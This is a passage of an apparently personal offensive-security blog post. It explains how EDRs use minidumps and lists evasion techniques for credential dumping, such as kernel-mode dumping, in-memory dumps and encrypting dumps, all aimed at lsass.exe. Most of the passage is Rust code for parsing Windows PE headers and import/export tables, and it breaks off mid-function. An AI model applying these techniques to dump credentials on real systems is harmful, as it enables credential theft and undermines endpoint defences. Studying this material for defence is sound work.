extension of traditional AVs, in that they have a heightened level of access to the underlying OS and, in some cases, even the kernel. i won\u0026rsquo;t bore you too much with how exactly EDRs work, but there are some important points to remember:\nEDRs use behavioural analysis to detect threats, while AVs traditionally rely on signature matching.\nEDRs leverage AI/ML for more sophisticated threat (0-day) detection + automated response capabilities.\nEDRs provide continuous, real-time monitoring of endpoints and their activites.\nAV/EDR + minidumps creating minidumps that won\u0026rsquo;t trigger native security systems is of paramount importance to EDRs. to do this, many EDRs (and even some AVs) use custom minidumpers to capture specific memory regions of interest when a suspicious event occurs.\ntake the crudely illustrated example above. the entire process is enclosed within the EDR\u0026rsquo;s system, and starts at minidump creation, where the EDR creates memory snapshots of running processes. these minidumps are then sent to the analysis engine, which examines the contents of the dumpfile for signs of malicious activity. the threat detection component receives these analysis results and identifies potential threats, based on the ruleset that it was fed during the design process.\nas you can see, this is a cyclical process: continuous monitoring feeds back into the minidump creation, and so on. but how exactly do EDRs achieve this?\ncustom minidumpers EDRs have a vested interest in monitoring + controlling minidump creation. since minidumps contain snapshots of process memory, EDRs need to be able to prevent unauthorized data extraction, credential harvesting (like dumping lsass.exe), and attacks like process injection. this is done by EDRs leveraging custom minidumpers. ironically, attackers use custom minidumpers to evade detection and make reverse engineering malware more convoluted, but more on that later.\nbasically, everything malware might use custom minidumpers for is used by EDRs to foil it in the first place.\nlet\u0026rsquo;s look at memory forensics, for example. custom minidumpers are used to capture specific memory regions, which is crucial for gathering IoCs and analyzing malware behaviour in-memory (while it\u0026rsquo;s running in RAM as opposed to being stored as a static file on disk; this is also incredibly helpful for fileless malware ).\nsome more ways custom minidumpers are used by EDRs: optimizing egress bandwidth + reducing system overhead during analysis.\nidentifying memory regions where malware attempts to hide (code injection, process hollowing).\ncapturing kernel-mode memory regions for rootkit analysis (driver-based malware, malicious kernel mods).\nif you haven\u0026rsquo;t already guessed, i\u0026rsquo;m going to be creating my own custom minidumper to see if i can exploit some EDR blindspots! now, let\u0026rsquo;s dive into some technical details about minidumpers.\nminidumpers: the boring stuff minidumps are typically stored as binary files with a structd format, often with the .dmp extension on Windows systems, and they contain a curated subset of the full process memory:\ncritical memory regions, like stacks + heaps.\nsystem + process information: this includes the process ID (identifying the specific process that the dump belongs to), timestamp (for correlating with system events + logs), OS version, and CPU architecture.\nthread contexts (register states): provide snapshots of CPU registers for each thread (get exact state of execution), thread stacks (call history + local variables), thread-local storage (holds thread-specific data, analyzing thread isolation and potential race conditions)\nloaded module details: identifying potential malicious injections, version conflicts, and provides the basis for symbol resolution during analysis.\nexception information (if triggered by an exception): exception code, exception address, exception parameters, first-chance/second-chance status.\nmemory regions: stack memory for each thread, selected heap regions.\nhandle information: open handles (resources currently in use by process), handle types + permissions.\nsystem information.\nadvanced minidump techniques advanced techniques for minidump creation go beyond standard API calls. the goal is to procure greater control, evasion capabilities, with full customization. let\u0026rsquo;s take a look at some of them.\ndirect memory access: use low-level memory access functions like ReadProcessMemory. this bypasses higher-level APIs that may be hooked or monitored. it allows for selective memory capture (evading detection), but requires a pretty thorough understanding of the memory layout + protection mechanisms.\nPEB parsing: directly accessing + parsing the PEB (Process Environment Block) struct. this also avoids easily-monitored APIs, and reveals information about loaded modules that might be hidden from standard APIs.\ncustom thread enumeration: use low-level APIs like NtQuerySystemInformation or parsing the kernel structs directly. this can reveal hidden or injected threads.\nmanual stack walking: implementing custom stack walking algorithms use architecture-specific techniques. this can allow for custom filtering + analysis, bypassing debugger APIs that may be detected or hooked.\nkernel-mode dumping: creating minidumps from kernel mode by use a custom driver. this allows us to dump protected process and bypass user-mode restrictions + detections.\nin-memory dump creation: creating dumps entirely in-memory without writing to disk. this is crucial if you want to avoid leaving artifacts on disk that can be detected, but you need custom analysis tools along with careful memory management to handle potentially large dumps.\nselective component dumping: creating highly targeted dumps, and significantly reducing dump size + creation time.\nencryption + obfuscation: evading signature-based detection of dump files by encrypting the dump data during or immediately after creation.\nas you might have guessed, there are many different ways of leveraging custom minidumpers to dump lsass.exe. for this project, however, i\u0026rsquo;m going to start with understanding + mapping the portable executable.\nPE: Portable Executable PE is a file format used in Windows for executables, object code, and dynamic link libraries (DLLs). simply put, it\u0026rsquo;s the standard format for binary programs on Windows and is used by the OS to manage the execution of applications.\nwhen a process is created (a kernel-level operation), the creation of the PE is the second step, following the initialization of the address space. before i get into how the PE is created, let\u0026rsquo;s take a look at what it consists of.\nthe PE file begins with an MS-DOS header, which includes a magic number (MZ) that identifies the file as a DOS executable. this header is primarily for backward compatibility and includes a pointer to the PE header.\nthe PE header defines the program\u0026rsquo;s binary code, images, number of sections, the entry point address of the program, the target machine architecture, and more. it also contains a timestamp, which attackers can sometimes remove.\nthe Optional header, despite its name, is not optional. it defines the size of the code, the preferred base address, and the OS version.\nthe Section headers contain chunks of data mapped into memory, and instructions about how the program should be loaded into the memory (e.g., a contiguous string of bytes in memory?). they also contain the permissions to be granted to the sections (read, write, execute).\nthe .text section contains the executable program code. the .idata section contains the IAT (Import Address Table), which lists the DLLs + their functions (i.e., the library calls a program makes). the .rsrc section contains the resources used by the PE. these could be printable character strings, graphical images, and other assets.\nfinally, we have the .reloc section. since the PE binary is not \u0026ldquo;position-independent\u0026rdquo; (i.e., it won\u0026rsquo;t work if moved from the intended location to a new location), .reloc tells the OS to translate memory addresses in the PE code if the PE has been moved (by adding/subtracting the offset from the memory address).\nthe section headers. you can see the virtual address and the raw address (the offset where the mapping starts). the characteristics breakdown of each section. the import directory. this PE imports from two libraries: testlib.dll and KERNEL32.dll. the KERNEL32.dll contains all of the Windows APIs. the exports directory. by now you might be wondering: who cares? or, at the very least, why is the PE so important? and what does it have to do with creating custom minidumpers? i\u0026rsquo;m not going to answer the first question, and i think i\u0026rsquo;ve already answered the second question. so, i\u0026rsquo;m going to address the third question.\nPE + minidumpers the PE format provides detailed information about the modules (executables + DLLs) loaded into a process\u0026rsquo;s memory. this includes their base addresses, sizes, and sections. custom minidumpers need this information to capture the state of a process and its dependencies.\nthe PE also includes data directories that point to export + import tables. these tables describe which functions a module provides, and which external functions it relies on. this information is often included in minidumps to help engineers trace function calls + dependencies. the data directories also contain relocation information, which describe how a module\u0026rsquo;s code/data are relocated in memory. the relocation entries help to adjust addresses when a module is loaded at a different base address than expected.\ncustom minidumpers will also need the debugging information (symbol tables, line number data), security analysis (checksums, integrity), and everything else that the PE format provides. the PE format is a blueprint, so the logical first-step is to create a tool that parses + manipulates it.\nmapping out the PE format in Rust our custom minidumper starts with understanding + mapping out the the PE format. this is because we\u0026rsquo;ll eventually be analyzing/manipulating Windows executables. we\u0026rsquo;ll also be extracting specific information from the process\u0026rsquo;s memory. then, we\u0026rsquo;ll define custom structs that mirror the PE format, since we\u0026rsquo;ll be serializing/deserializing data in a specific way.\nbefore i get into the code, i\u0026rsquo;ll provide a 1000-foot view of how this program works.\na variety of data structs that represent different parts of the PE format (ImageDosHeader, ImageNtHeaders64, ImageOptionalHeader64, ImageDataDirectory, etc.) will be defined. these will allow us to parse the headers + sections of a PE file.\nwe\u0026rsquo;ll also have to create RVA (Relative Virtual Address) handling, specifically with RVA32 + RVA64 types. these types will provide methods to resolve RVAs to actual memory addresses.\nwe\u0026rsquo;ll also have to access the export/import tables of a module (get_export_table, get_import_directory_table), to verify which functions are available or not.\nto handle COFF symbols + section headers, a module will be needed to extract the symbol information and section characteristics. this is for debugging + analysis.\nby defining my own structs + parsing logic, we can tailor the minidump to include exactly what we need and evade detection that looks for standard minidump patterns. custom parsing + dumping techniques are less detectable than use standard APIs, and stealth is always a priority in offensive security.\na note on why i chose Rust: Rust\u0026rsquo;s combination of performance, safety, and modernity makes it an excellent choice for developing a custom minidumper. its ability to provide low-level control without sacrificing safety is advantageous in security-focused projects, where both performance + reliability are paramount. this project can now achieve high efficiency and robustness, making it a powerful tool offensive security.\ncode #![allow(dead_code)] use core::mem::transmute; use std::slice; use bitflags::bitflags; // parsed PE32+ struct pub struct PE64 { pub pe64: Box\u0026lt;Pe64C\u0026gt;, pub base_address: usize, pub data_directories: ImageDataDirectoryVec, } // return reference to ImageDataDirectoryVec impl PE64 { pub fn get_data_directories(\u0026amp;self) -\u0026gt; \u0026amp;ImageDataDirectoryVec { \u0026amp;self.data_directories } } // \u0026#34;C\u0026#34; style representation of a parsed PE32+ struct #[derive(Clone)] #[repr(C)] pub struct Pe64C { pub dos_header: ImageDosHeader, } impl Pe64C { pub fn get_nt_headers(\u0026amp;self) -\u0026gt; \u0026amp;ImageNtHeaders64 { let nt_headers = self.dos_header.e_lfanew.get(self as *const _ as usize); \u0026amp;*(nt_headers) } } // constant representing valid MS-DOS sig pub const IMAGE_DOS_SIGNATURE: u16 = u16::from_le_bytes(*b\u0026#34;MZ\u0026#34;); /// MS-DOS sig (MZ) #[derive(Copy, Clone)] #[repr(transparent)] pub struct ImageDosSignature(u16); // impl ImageDosSignature + verify sig is valid impl ImageDosSignature { pub fn is_valid(\u0026amp;self) -\u0026gt; bool { self.0 == IMAGE_DOS_SIGNATURE } } #[derive(Clone)] #[repr(C)] pub struct ImageDosHeader { pub e_magic: ImageDosSignature, pub e_cblp: u16, pub e_cp: u16, pub e_crlc: u16, pub e_cparhdr: u16, pub e_minalloc: u16, pub e_maxalloc: u16, pub e_ss: u16, pub e_sp: u16, pub e_csum: u16, pub e_ip: u16, pub e_cs: u16, pub e_lfarlc: u16, pub e_ovno: u16, pub e_res: [u16; 4], pub e_oemid: u16, pub e_oeminfo: u16, pub e_res2: [u16; 10], // offset from module base to ImageNtHeaders64 struct pub e_lfanew: RVA32\u0026lt;ImageNtHeaders64\u0026gt;, } #[derive(Clone)] #[repr(C)] pub struct ImageNtHeaders64 { pub signature: PESignature, pub file_header: ImageFileHeader, pub optional_header: ImageOptionalHeader64, } // PEType is an enum representing pe32 or pe32+ identifiers #[derive(PartialEq, Eq, Copy, Clone)] #[repr(u16)] pub enum PEType { PE32 = 0x10b, PE64 = 0x20b, } // ImageOptionalHeader64 struct #[derive(Clone)] #[repr(C)] pub struct ImageOptionalHeader64 { pub magic: PEType, pub major_linker_version: u8, pub minor_linker_version: u8, pub size_of_code: u32, pub size_of_initialized_data: u32, pub size_of_uninitialized_data: u32, pub address_of_entry_point: RVA32\u0026lt;extern \u0026#34;C\u0026#34; fn()\u0026gt;, pub base_of_code: u32, pub image_base: u64, pub section_alignment: u32, pub file_alignment: u32, pub major_operating_system_version: u16, pub minor_operating_system_version: u16, pub major_image_version: u16, pub minor_image_version: u16, pub major_subsystem_version: u16, pub minor_subsystem_version: u16, pub win32_version_value: u32, pub size_of_image: u32, pub size_of_headers: u32, pub check_sum: u32, pub subsystem: WindowsSubsystem, pub dll_characteristics: u16, pub size_of_stack_reserve: u64, pub size_of_stack_commit: u64, pub size_of_heap_reserve: u64, pub size_of_heap_commit: u64, pub loader_flags: u32, pub number_of_rva_and_sizes: u32, // data directory is an array of ImageDataDirectory structs // size is based on number_of_rva_and_sizes field in this struct pub data_directory: [ImageDataDirectory; 0], } // ImageDataDirectory struct pub struct ImageDataDirectoryVec(pub Vec\u0026lt;ImageDataDirectoryInfo\u0026gt;); impl ImageDataDirectoryVec { // get entry corresponding to export table pub fn get_export_table(\u0026amp;self) -\u0026gt; Option\u0026lt;\u0026amp;ExportDirectoryTable\u0026gt; { // loop thru data dirs + find entry with matching type for entry in self.0.iter() { if entry.name == ImageDataDirectoryEntry::ExportTable { // get table pointer by converting the RVA32 to actual address // use .getd the virtual_address base, then cast to ExportDirectoryTable pointer type let table = entry.virtual_address.get(entry.base_address); // cast table to reference to ExportDirectoryTable let table = unsafe { transmute(table) }; // return table return Some(table); } } None } pub fn get_import_directory_table(\u0026amp;self) -\u0026gt; Option\u0026lt;\u0026amp;ImportDirectoryTable\u0026gt; { // loop thru data directories and find the entry with matching type for entry in self.0.iter() { if entry.name == ImageDataDirectoryEntry::ImportTable { // get table pointer by converting the RVA32 to actual address // use .getd the virtual_address base, then cast to ImportDirectoryTable pointer type let table = entry.virtual_address.get(entry.base_address); // cast table to ref to ImportDirectoryTable let table = unsafe { transmute(table) }; // return table return Some(table); } } None } pub fn get_import_lookup_table(\u0026amp;self) -\u0026gt; Option\u0026lt;\u0026amp;ImportLookupTable\u0026gt; { // loop thru data directories + find entry with matching type for entry in self.0.iter() { if entry.name == ImageDataDirectoryEntry::ImportTable { // get table pointer by converting the RVA32 to actual address // use .getd the virtual_address base, then cast to ImportDirectoryTable pointer type let table = entry.virtual_address.get(entry.base_address); // cast table to reference to ImportDirectoryTable let table: \u0026amp;ImportDirectoryTable = unsafe { transmute(table) }; let import_lookup_table = table.import_lookup_table_rva.get(entry.base_address); let import_lookup_table = unsafe { transmute(import_lookup_table) }; // return table return Some(import_lookup_table); } } None } // gets entry corresponding to import table pub fn get_import_address_table(\u0026amp;self) -\u0026gt; Option\u0026lt;ImportAddressTableR\u0026gt; { // get pointer to ImportLookupTable let import_lookup_table = self.get_import_lookup_table().unwrap(); // loop thru data directories + find the entry with matching type for entry in self.0.iter() { if entry.name == ImageDataDirectoryEntry::IAT { // get table pointer by converting the RVA32 to actual address // use .getd the virtual_address base, then cast to ImportDirectoryTable pointer type let table = entry.virtual_address.get(entry.base_address); // cast table to reference to ImportDirectoryTable let table: \u0026amp;ImportAddressTable = unsafe { transmute(table) }; // create ImportAddressTableR struct and fill it with entries from ImportAddressTable let mut table_r = ImportAddressTableR::default(); // get count of entries in table by dividing entry.size by size of u64 let count = entry.size as usize / core::mem::size_of::\u0026lt;u64\u0026gt;(); // loop thru entries in table and add them to table_r for i in 0..count { let entry = unsafe { table.addresses.get_unchecked(i) }; let import_lookup_table_entry = unsafe { import_lookup_table.entry.get_unchecked(i) }; // if entries are identical, target has not been bound // could handle this, but skip it instead if *entry == *import_lookup_table_entry { continue; } // ensure entry is not null assert_ne!(entry as *const u64 as *const _ as u64, 0); // create ImportAddressEntry struct let entry_r = ImportAddressEntry { iat_entry_address: entry as *const _ as u64, target_function_address: *entry, }; // add entry to ImportAddressTableR table_r.addresses.push(entry_r); } // return table return Some(table_r); } } None } pub fn is_within_range( \u0026amp;self, target_type: ImageDataDirectoryEntry, address: usize, ) -\u0026gt; Option\u0026lt;bool\u0026gt; { // loop thru data directories and find the entry with matching type for entry in self.0.iter() { if entry.name == target_type { // get table pointer by converting the RVA32 to actual address // use .getd the virtual_address base, then cast to ExportDirectoryTable pointer type let start_addr = entry.virtual_address.get(entry.base_address) as *const _ as usize; let end_addr = start_addr + entry.size as usize; return Some(address \u0026gt;= start_addr \u0026amp;\u0026amp; address \u0026lt; end_addr); } } None } } // define ImageDataDirectory struct #[derive(Clone)] #[repr(C)] pub struct ImageDataDirectory { pub virtual_address: u32, pub size: u32, } pub struct ImageDataDirectoryInfo { pub virtual_address: RVA32\u0026lt;()\u0026gt;, pub size: u32, pub base_address: usize, pub name: ImageDataDirectoryEntry, } impl ImageDataDirectoryInfo { // checks if provided usize is within range of this section described by the combination of the base_address and our virtual_address RVA pub fn is_within_range(\u0026amp;self, address: usize) -\u0026gt; bool { let base_address = self.base_address; let virtual_address = self.virtual_address.get(base_address) as *const _ as usize; address \u0026gt;= virtual_address \u0026amp;\u0026amp; address \u0026lt; virtual_address + self.size as usize } } // export Directory Table as described in PE format #[derive(Clone)] #[repr(C)] pub struct ExportDirectoryTable { pub characteristics: u32, pub time_date_stamp: u32, pub major_version: u16, pub minor_version: u16, pub name: u32, pub ordinal_base: u32, pub number_of_functions: u32, pub number_of_names: u32, pub export_address_table_rva: RVA32\u0026lt;ExportAddressTable\u0026gt;, pub name_ptr_rva: RVA32\u0026lt;ExportNamePtrTable\u0026gt;, pub ordinal_table_rva: RVA32\u0026lt;ExportOrdinalTable\u0026gt;, } // define import directory table as described in PE format #[derive(Clone)] #[repr(C)] pub struct ImportDirectoryTable { pub import_lookup_table_rva: RVA32\u0026lt;ImportLookupTable\u0026gt;, pub time_date_stamp: u32, pub forwarder_chain: u32, pub name_rva: RVA32\u0026lt;ASCIIString\u0026gt;, pub import_address_table_rva: RVA32\u0026lt;ImportAddressTable\u0026gt;, } // define import address table #[derive(Clone)] #[repr(C)] pub struct ImportAddressTable { pub addresses: [u64; 0], } #[derive(Clone)] #[repr(C)] pub struct ImportAddressEntry { pub iat_entry_address: u64, pub target_function_address: u64, } #[derive(Clone, Default)] pub struct ImportAddressTableR { pub addresses: Vec\u0026lt;ImportAddressEntry\u0026gt;, } // define import lookup table #[derive(Clone)] #[repr(C)] pub struct ImportLookupTable { pub entry: [u64; 0], } // define ExportOrdinalTable (array of u16) #[derive(Clone)] #[repr(C)] pub struct ExportOrdinalTable { pub ordinals: [ExportAddressTableIndex; 0], } // ExportNamePtrTable is an array of RVA32s to ASCII strings #[derive(Clone)] #[repr(C)] pub struct ExportNamePtrTable { pub name_ptr: [RVA32\u0026lt;ASCIIString\u0026gt;; 0], } // defines ASCIIString type (null terminated ASCII string) #[derive(Clone)] #[repr(C)] pub struct ASCIIString { pub string: [u8; 0], } impl ASCIIString { // enumerates bytes of string until it finds a null byte, returns the length. // manually count bytes as type has no associated size information pub fn len(\u0026amp;self) -\u0026gt; usize { let mut len = 0; loop { if unsafe { *self.string.get_unchecked(len) } == 0 { return len; } len += 1; } } // converts ASCIIString to Rust String pub fn to_string(\u0026amp;self) -\u0026gt; String { let len = self.len(); let mut string = String::with_capacity(len); for i in 0..len { string.push(unsafe { *self.string.get_unchecked(i) } as char); } string } } impl ExportDirectoryTable { // get entry from the export_address_table_rva by obtaining ExportAddressTable + indexing into it with provided index, checking that index is within bounds based on the number_of_functions field pub fn get_export_address_table_entry( \u0026amp;self, index: ExportAddressTableIndex, base_address: usize, ) -\u0026gt; Option\u0026lt;\u0026amp;ExportAddressTableEntry\u0026gt; { let index = index.0 as usize; if index \u0026gt;= self.number_of_functions as usize { return None; } // get underlying ExportAddressTable by applying the base_address to RVA32 let export_address_table = self.export_address_table_rva.get(base_address); // index into table, use an unchecked index as the table is defined as a 0-size array + and index is checked above let entry = unsafe { export_address_table.entries.get_unchecked(index) }; Some(entry) } // gets entry from ExportOrdinalTable, similar to how we get entries from ExportAddressTable pub fn get_export_ordinal_table_entry( \u0026amp;self, index: OrdinalTableIndex, base_address: usize, ) -\u0026gt; Option\u0026lt;\u0026amp;ExportAddressTableIndex\u0026gt; { let index = index.0 as usize; if index \u0026gt;= self.number_of_names as usize { return None; } let export_ordinal_table = self.ordinal_table_rva.get(base_address); Some(unsafe { export_ordinal_table.ordinals.get_unchecked(index) }) } // enumerates ExportNamePtrTable looking for String match with provided name // gets ExportNamePtrTable use the provided base_address, similar to how we get tables in get_export_address_table_entry +get_export_ordinal_table_entry. // return value is option around index corresponding to String match found (if any) pub fn get_export_name_ptr_table_entry( \u0026amp;self, name: \u0026amp;str, base_address: usize, ) -\u0026gt; Option\u0026lt;OrdinalTableIndex\u0026gt; { let export_name_ptr_table = self.name_ptr_rva.get(base_address); for i in 0..self.number_of_names { let export_name_ptr = unsafe { export_name_ptr_table.name_ptr.get_unchecked(i as usize) }; let export_name = export_name_ptr.get(base_address); if export_name.to_string().to_lowercase() == name.to_lowercase() { return Some(OrdinalTableIndex(i)); } } None } } #[derive(Clone, Copy)] #[repr(C)] pub struct ExportAddressTableIndex(u16); #[derive(Clone, Copy)] #[repr(C)] pub struct OrdinalTableIndex(u32); // define ExportAddressTableEntry which is a RVA32 to either a function or a string #[derive(Clone)] #[repr(transparent)] pub struct ExportAddressTableEntry(pub RVA32\u0026lt;()\u0026gt;); // ExportAddressTable #[derive(Clone)] #[repr(C)] pub struct ExportAddressTable { // export address table is array of u32 values // size based on number_of_functions field in ExportDirectoryTable pub entries: [ExportAddressTableEntry; 0], } // enum representing ImageDataDirectory entries #[derive(PartialEq, Eq, Copy, Clone)] pub enum ImageDataDirectoryEntry { ExportTable = 0, ImportTable = 1, ResourceTable = 2, ExceptionTable = 3, CertificateTable = 4, BaseRelocationTable = 5, Debug = 6, Architecture = 7, GlobalPtr = 8, TLSTable = 9, LoadConfigTable = 10, BoundImport = 11, IAT = 12, DelayImportDescriptor = 13, CLRRuntimeHeader = 14, Reserved = 15, } // impl ImageDataDirectoryEntry to convert index into enum impl ImageDataDirectoryEntry { pub fn from_index(index: usize) -\u0026gt; Option\u0026lt;ImageDataDirectoryEntry\u0026gt; { match index { 0 =\u0026gt; Some(ImageDataDirectoryEntry::ExportTable), 1 =\u0026gt; Some(ImageDataDirectoryEntry::ImportTable), 2 =\u0026gt; Some(ImageDataDirectoryEntry::ResourceTable), 3 =\u0026gt; Some(ImageDataDirectoryEntry::ExceptionTable), 4 =\u0026gt; Some(ImageDataDirectoryEntry::CertificateTable), 5 =\u0026gt; Some(ImageDataDirectoryEntry::BaseRelocationTable), 6 =\u0026gt; Some(ImageDataDirectoryEntry::Debug), 7 =\u0026gt; Some(ImageDataDirectoryEntry::Architecture), 8 =\u0026gt; Some(ImageDataDirectoryEntry::GlobalPtr), 9 =\u0026gt; Some(ImageDataDirectoryEntry::TLSTable), 10 =\u0026gt; Some(ImageDataDirectoryEntry::LoadConfigTable), 11 =\u0026gt; Some(ImageDataDirectoryEntry::BoundImport), 12 =\u0026gt; Some(ImageDataDirectoryEntry::IAT), 13 =\u0026gt; Some(ImageDataDirectoryEntry::DelayImportDescriptor), 14 =\u0026gt; Some(ImageDataDirectoryEntry::CLRRuntimeHeader), 15 =\u0026gt; Some(ImageDataDirectoryEntry::Reserved), _ =\u0026gt; None, } } // convert enum into usize index pub fn to_index(\u0026amp;self) -\u0026gt; usize { match self { ImageDataDirectoryEntry::ExportTable =\u0026gt; 0, ImageDataDirectoryEntry::ImportTable =\u0026gt; 1, ImageDataDirectoryEntry::ResourceTable =\u0026gt; 2, ImageDataDirectoryEntry::ExceptionTable =\u0026gt; 3, ImageDataDirectoryEntry::CertificateTable =\u0026gt; 4, ImageDataDirectoryEntry::BaseRelocationTable =\u0026gt; 5, ImageDataDirectoryEntry::Debug =\u0026gt; 6, ImageDataDirectoryEntry::Architecture =\u0026gt; 7, ImageDataDirectoryEntry::GlobalPtr =\u0026gt; 8, ImageDataDirectoryEntry::TLSTable =\u0026gt; 9, ImageDataDirectoryEntry::LoadConfigTable =\u0026gt; 10, ImageDataDirectoryEntry::BoundImport =\u0026gt; 11, ImageDataDirectoryEntry::IAT =\u0026gt; 12, ImageDataDirectoryEntry::DelayImportDescriptor =\u0026gt; 13, ImageDataDirectoryEntry::CLRRuntimeHeader =\u0026gt; 14, ImageDataDirectoryEntry::Reserved =\u0026gt; 15, } } } // enum representing valid Windows Subsystem values #[derive(PartialEq, Eq, Copy, Clone)] #[repr(u16)] pub enum WindowsSubsystem { ImageSubsystemUnknown = 0, ImageSubsystemNative = 1, ImageSubsystemWindowsGui = 2, ImageSubsystemWindowsCui = 3, ImageSubsystemOs2Cui = 5, ImageSubsystemPosixCui = 7, ImageSubsystemNativeWindows = 8, ImageSubsystemWindowsCeGui = 9, ImageSubsystemEfiApplication = 10, ImageSubsystemEfiBootServiceDriver = 11, ImageSubsystemEfiRuntimeDriver = 12, ImageSubsystemEfiRom = 13, ImageSubsystemXbox = 14, ImageSubsystemWindowsBootApplication = 16, } bitflags! { /// `SectionCharacteristics` bitflags used to describe characteristics of sections pub struct SectionCharacteristics: u32 { const IMAGE_SCN_TYPE_NO_PAD = 0x00000008; const IMAGE_SCN_CNT_CODE = 0x00000020; const IMAGE_SCN_CNT_INITIALIZED_DATA = 0x00000040; const IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080; const IMAGE_SCN_LNK_OTHER = 0x00000100; const IMAGE_SCN_LNK_INFO = 0x00000200; const IMAGE_SCN_LNK_REMOVE = 0x00000800; const IMAGE_SCN_LNK_COMDAT = 0x00001000; const IMAGE_SCN_GPREL = 0x00008000; const IMAGE_SCN_MEM_PURGEABLE = 0x00020000; const IMAGE_SCN_MEM_16BIT = 0x00020000; const IMAGE_SCN_MEM_LOCKED = 0x00040000; const IMAGE_SCN_MEM_PRELOAD = 0x00080000; const IMAGE_SCN_ALIGN_1BYTES = 0x00100000; const IMAGE_SCN_ALIGN_2BYTES = 0x00200000; const IMAGE_SCN_ALIGN_4BYTES = 0x00300000; const IMAGE_SCN_ALIGN_8BYTES = 0x00400000; const IMAGE_SCN_ALIGN_16BYTES = 0x00500000; const IMAGE_SCN_ALIGN_32BYTES = 0x00600000; const IMAGE_SCN_ALIGN_64BYTES = 0x00700000; const IMAGE_SCN_ALIGN_128BYTES = 0x00800000; const IMAGE_SCN_ALIGN_256BYTES = 0x00900000; const IMAGE_SCN_ALIGN_512BYTES = 0x00A00000; const IMAGE_SCN_ALIGN_1024BYTES = 0x00B00000; const IMAGE_SCN_ALIGN_2048BYTES = 0x00C00000; const IMAGE_SCN_ALIGN_4096BYTES = 0x00D00000; const IMAGE_SCN_ALIGN_8192BYTES = 0x00E00000; const IMAGE_SCN_LNK_NRELOC_OVFL = 0x01000000; const IMAGE_SCN_MEM_DISCARDABLE = 0x02000000; const IMAGE_SCN_MEM_NOT_CACHED = 0x04000000; const IMAGE_SCN_MEM_NOT_PAGED = 0x08000000; const IMAGE_SCN_MEM_SHARED = 0x10000000; const IMAGE_SCN_MEM_EXECUTE = 0x20000000; const IMAGE_SCN_MEM_READ = 0x40000000; const IMAGE_SCN_MEM_WRITE = 0x80000000; } } #[derive(Copy, Clone)] #[repr(C)] pub struct PEB { junk1: u32, junk2: usize, junk3: usize, pub ldr: *const PebLdrData, } #[derive(Copy, Clone, Debug)] #[repr(C)] pub struct ListEntry { pub flink: *const ListEntry, pub blink: *const ListEntry, } #[derive(Copy, Clone)] #[repr(C)] pub struct PebLdrData { pub junk: [usize; 4], pub in_memory_order_module_list: ListEntry, } #[derive(Copy, Clone, Debug)] #[repr(C)] pub struct LdrDataTableEntry { pub in_load_order_links: ListEntry, pub in_memory_order_links: ListEntry, pub in_initialization_order_links: ListEntry, pub dll_base: usize, pub entry_point: usize, pub size_of_image: usize, pub full_dll_name: UnicodeString, pub base_dll_name: UnicodeString, pub flags: u32, pub load_count: u16, pub tls_index: u16, pub hash_links: ListEntry, pub time_date_stamp: u32, } #[derive(Copy, Clone)] #[repr(packed)] pub struct CoffX64Relocation { pub virtual_address: u32, pub symbol_table_index: u32, pub typ: CoffX64RelocationType, } #[derive(Copy, Clone, Eq, PartialEq, Debug)] #[repr(u16)] pub enum CoffX64RelocationType { ImageRelAmd64Absolute = 0x0000, ImageRelAmd64Addr64 = 0x0001, ImageRelAmd64Addr32 = 0x0002, ImageRelAmd64Addr32nb = 0x0003, ImageRelAmd64Rel32 = 0x0004, ImageRelAmd64Rel321 = 0x0005, ImageRelAmd64Rel322 = 0x0006, ImageRelAmd64Rel323 = 0x0007, ImageRelAmd64Rel324 = 0x0008, ImageRelAmd64Rel325 = 0x0009, ImageRelAmd64Section = 0x000A, ImageRelAmd64Secrel = 0x000B, ImageRelAmd64Secrel7 = 0x000C, ImageRelAmd64Token = 0x000D, ImageRelAmd64Srel32 = 0x000E, ImageRelAmd64Pair = 0x000F, ImageRelAmd64Sspan32 = 0x0010, } #[derive(Clone)] #[repr(packed)] pub struct SectionHeader { pub name: [u8; 8], pub virtual_size: u32, pub virtual_address: u32, pub size_of_raw_data: u32, pub pointer_to_raw_data: u32, pub pointer_to_relocations: u32, pub pointer_to_line_numbers: u32, pub number_of_relocations: u16, pub number_of_line_numbers: u16, pub characteristics: SectionCharacteristics, } impl SectionHeader { pub fn get_name(\u0026amp;self, str_table: usize) -\u0026gt; String { if self.name[0] == b\u0026#39;/\u0026#39; { let mut offset = String::new(); for i in 1..8 { if self.name[i] == 0 { break; } offset.push(self.name[i] as char); } // convert ASCII representation of offset into u64 let offset: usize = usize::from_str_radix(\u0026amp;offset, 10).unwrap(); // get string from string table let name_ptr = offset as usize + str_table; // Convert name_ptr to a null-terminated str // collect all bytes in name_ptr until null byte is reached let mut name_bytes = Vec::new(); loop { let byte = unsafe { *((name_ptr + name_bytes.len()) as *const u8) }; if byte == 0 { break; } name_bytes.push(byte); } // convert the bytes to a str // **unsafe if object is corrupted // safety: remove unwrap + return Result return core::str::from_utf8(\u0026amp;name_bytes).unwrap().to_string(); } let mut name = String::new(); for i in 0..8 { if self.name[i] == 0 { break; } name.push(self.name[i] as char); } name } } #[derive(Clone)] #[repr(packed)] pub struct ImageFileHeader { pub machine: ImageFileMachine, pub number_of_sections: u16, pub time_date_stamp: u32, pub pointer_to_symbol_table: u32, pub number_of_symbols: u32, pub size_of_optional_header: u16, pub characteristics: u16, } impl ImageFileHeader { pub fn get_symbols(\u0026amp;self, base_address: usize) -\u0026gt; Option\u0026lt;\u0026amp;[CoffSymbol]\u0026gt; { if self.pointer_to_symbol_table == 0 { return None; } let symbol_table_ptr = (base_address + self.pointer_to_symbol_table as usize) as *const CoffSymbol; let symbol_table = unsafe { slice::from_raw_parts(symbol_table_ptr, self.number_of_symbols as usize) }; Some(symbol_table) } pub fn get_string_table(\u0026amp;self, base_address: usize) -\u0026gt; Option\u0026lt;\u0026amp;[u8]\u0026gt; { let symbol_table_ptr = base_address + self.pointer_to_symbol_table as usize; let str_table_ptr = symbol_table_ptr + (self.number_of_symbols as usize * core::mem::size_of::\u0026lt;CoffSymbol\u0026gt;()); let str_table_len = unsafe { *(str_table_ptr as *const u32) } as usize; if str_table_len == 0 { return None; } let str_table = unsafe { slice::from_raw_parts(str_table_ptr as *const u8, str_table_len) }; Some(str_table) } pub fn get_symbol_name(\u0026amp;self, base_address: usize, symbol: CoffSymbol) -\u0026gt; Option\u0026lt;String\u0026gt; { let symbol_table_ptr = base_address + self.pointer_to_symbol_table as usize; let str_table_ptr = symbol_table_ptr + (self.number_of_symbols as usize * core::mem::size_of::\u0026lt;CoffSymbol\u0026gt;()); let str_table_len = unsafe { *(str_table_ptr as 